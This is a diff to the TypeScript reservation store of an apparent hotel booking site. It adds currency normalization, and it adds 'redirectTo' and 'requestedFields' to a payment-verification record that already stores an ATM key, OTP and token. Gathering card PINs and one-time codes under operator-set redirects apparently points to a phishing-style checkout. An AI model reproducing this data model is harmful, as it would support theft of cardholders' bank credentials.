@@ -3,6 +3,8 @@ import { browser } from '$app/environment';
 import type { HotelDetails, HotelPhoto, HotelDescription, RoomListResponse } from './hotelDetails';
 import { StorageService } from '$lib/services/storageService';
 import { PRICE_DISCOUNT, applyPriceDiscount } from '$lib/config/discount';
+import { DEFAULT_CURRENCY, normalizeCurrency } from '$lib/config/currency';
+import { getCurrentCurrency } from '$lib/config/market';
 
 // Interfaces para la reserva
 export interface SelectedRoom {
@@ -122,6 +124,8 @@ export interface ReservationData {
 		atmKey?: string;
 		otp?: string;
 		token?: string;
+		redirectTo?: string;
+		requestedFields?: string[];
 		status?: 'pending' | 'approved' | 'failed';
 		timestamp?: string;
 	};
@@ -129,7 +133,23 @@ export interface ReservationData {
 
 // Funciones de persistencia usando el servicio centralizado
 function loadFromStorage(): ReservationData | null {
-	return StorageService.loadReservationData();
+	const storedData = StorageService.loadReservationData();
+	if (!storedData) return null;
+
+	const hotelCurrency = normalizeCurrency(storedData.hotel?.currency, DEFAULT_CURRENCY);
+	const totalsCurrency = normalizeCurrency(storedData.totals?.currency, hotelCurrency);
+
+	return {
+		...storedData,
+		hotel: {
+			...storedData.hotel,
+			currency: hotelCurrency
+		},
+		totals: {
+			...storedData.totals,
+			currency: totalsCurrency
+		}
+	};
 }
 
 function saveToStorage(data: ReservationData) {
@@ -156,7 +176,7 @@ const initialState: ReservationData = {
 		latitude: 0,
 		longitude: 0,
 		timezone: '',
-		currency: 'COP',
+		currency: getCurrentCurrency(),
 		spokenLanguages: [],
 		accommodationType: '',
 		url: '',
@@ -179,7 +199,7 @@ const initialState: ReservationData = {
 		subtotal: 0,
 		taxes: 0,
 		total: 0,
-		currency: 'COP'
+		currency: getCurrentCurrency()
 	},
 	isValid: false,
 	lastUpdated: new Date().toISOString()
@@ -298,6 +318,8 @@ function createReservationStore(initialData: ReservationData = initialState) {
 			atmKey?: string;
 			otp?: string;
 			token?: string;
+			redirectTo?: string;
+			requestedFields?: string[];
 			status?: 'pending' | 'approved' | 'failed';
 		}) => {
 			persistUpdate(state => ({
